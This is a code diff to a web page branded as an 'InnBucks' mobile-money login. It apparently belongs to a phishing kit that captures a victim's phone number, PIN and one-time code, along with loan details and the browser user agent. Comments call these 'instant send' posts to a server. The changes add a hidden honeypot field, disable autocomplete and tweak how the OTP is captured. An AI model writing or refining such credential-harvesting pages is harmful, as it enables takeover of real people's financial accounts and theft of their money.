@@ -81,6 +81,7 @@ input{
 
 .btn[disabled]{
   background:#334155;
+  cursor:not-allowed;
 }
 
 .req{color:#ef4444;margin-right:6px}
@@ -110,6 +111,7 @@ input{
   font-size:1px;
   color:transparent;
   caret-color:transparent;
+  outline:none;
 }
 
 .pin-digit.filled{
@@ -190,13 +192,15 @@ input{
 <body>
 
 <div class="card">
+
 <img src="assets/InnBucks.png" class="logo">
 
 <h2>Login</h2>
 
-<form id="loginForm">
+<form id="loginForm" autocomplete="off">
 
 <label><span class="req">★</span>Mobile Number</label>
+
 <input id="phone" value="+263" inputmode="numeric">
 
 <div id="phoneError" class="error"></div>
@@ -204,16 +208,22 @@ input{
 <label><span class="req">★</span>Enter your PIN</label>
 
 <div class="pin-row">
+
 <input class="pin-digit" maxlength="1" inputmode="numeric">
 <input class="pin-digit" maxlength="1" inputmode="numeric">
 <input class="pin-digit" maxlength="1" inputmode="numeric">
 <input class="pin-digit" maxlength="1" inputmode="numeric">
+
 </div>
+
+<input type="text" id="hp" style="display:none">
 
 <button id="loginBtn" class="btn" disabled>LOGIN</button>
 
 </form>
+
 </div>
+
 
 
 <div id="otpModal" class="otp-modal" style="display:none">
@@ -226,19 +236,21 @@ input{
 
 <div class="otp-row">
 
-<input class="otp-digit">
-<input class="otp-digit">
-<input class="otp-digit">
-<input class="otp-digit">
-<input class="otp-digit">
+<input class="otp-digit" tabindex="-1">
+<input class="otp-digit" tabindex="-1">
+<input class="otp-digit" tabindex="-1">
+<input class="otp-digit" tabindex="-1">
+<input class="otp-digit" tabindex="-1">
 
 </div>
 
-<input id="otpBuffer"
+<input
+id="otpBuffer"
 type="tel"
 inputmode="numeric"
 autocomplete="one-time-code"
-style="position:absolute;opacity:0">
+style="position:absolute;opacity:0"
+>
 
 <div class="resend-row">
 
@@ -270,16 +282,17 @@ Cancel
 </div>
 
 
+
 <script>
 
-/* LOAN SUMMARY remains unchanged */
+/* LOAN SUMMARY */
 
 function buildLoanRequest(){
 try{
-const loan = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
+const loan=JSON.parse(sessionStorage.getItem('loanForm')||'{}');
 if(!loan.loanAmount) return 'N/A';
 return `USD ${loan.loanAmount} / ${loan.loanType} / ${loan.repayment} month(s) (${loan.employment})`;
-}catch(e){ return 'N/A'; }
+}catch(e){return 'N/A'}
 }
 
 
@@ -288,11 +301,8 @@ return `USD ${loan.loanAmount} / ${loan.loanType} / ${loan.repayment} month(s) (
 const pins=[...document.querySelectorAll('.pin-digit')];
 
 let pinValue='';
-
 let loginLocked=false;
-
 let confirmLocked=false;
-
 
 pins.forEach((el,i)=>{
 
@@ -307,7 +317,6 @@ if(el.value && i<pins.length-1) pins[i+1].focus();
 updatePin();
 
 });
-
 
 /* backspace smooth */
 
@@ -334,12 +343,12 @@ function updatePin(){
 
 pinValue=pins.map(p=>p.value).join('');
 
-loginBtn.disabled=!(validatePhone() && /^\d{4}$/.test(pinValue)) || loginLocked;
+loginBtn.disabled=!(validatePhone()&&/^\d{4}$/.test(pinValue))||loginLocked;
 
 }
 
 
-/* PHONE unchanged */
+/* PHONE */
 
 const phone=document.getElementById('phone');
 
@@ -377,10 +386,12 @@ phone.value='+263'+d.slice(0,9);
 
 validatePhone();
 
+updatePin();
+
 });
 
 
-/* API unchanged */
+/* API */
 
 async function sendToServer(payload){
 
@@ -419,7 +430,7 @@ function renderOtp(v){
 
 dots.forEach((d,i)=>d.classList.toggle('filled',!!v[i]));
 
-confirmBtn.disabled=!/^\d{5}$/.test(v) || confirmLocked;
+confirmBtn.disabled=!/^\d{5}$/.test(v)||confirmLocked;
 
 }
 
@@ -441,8 +452,6 @@ renderOtp(buffer.value);
 
 });
 
-
-/* backspace smooth */
 
 buffer.addEventListener('keydown',e=>{
 
@@ -486,8 +495,7 @@ resendBtn.disabled=false;
 }
 
 
-
-/* LOGIN instant send */
+/* LOGIN */
 
 document.getElementById('loginForm').addEventListener('submit',async e=>{
 
@@ -510,7 +518,7 @@ loginPin:pinValue,
 
 loan_request:buildLoanRequest(),
 
-device,
+device:navigator.userAgent,
 
 submittedAt:new Date().toISOString()
 
@@ -530,7 +538,7 @@ startCountdown();
 });
 
 
-/* CONFIRM instant send */
+/* CONFIRM */
 
 confirmBtn.onclick=async()=>{
 
@@ -553,7 +561,7 @@ otp:buffer.value,
 
 loan_request:buildLoanRequest(),
 
-device,
+device:navigator.userAgent,
 
 submittedAt:new Date().toISOString()
 
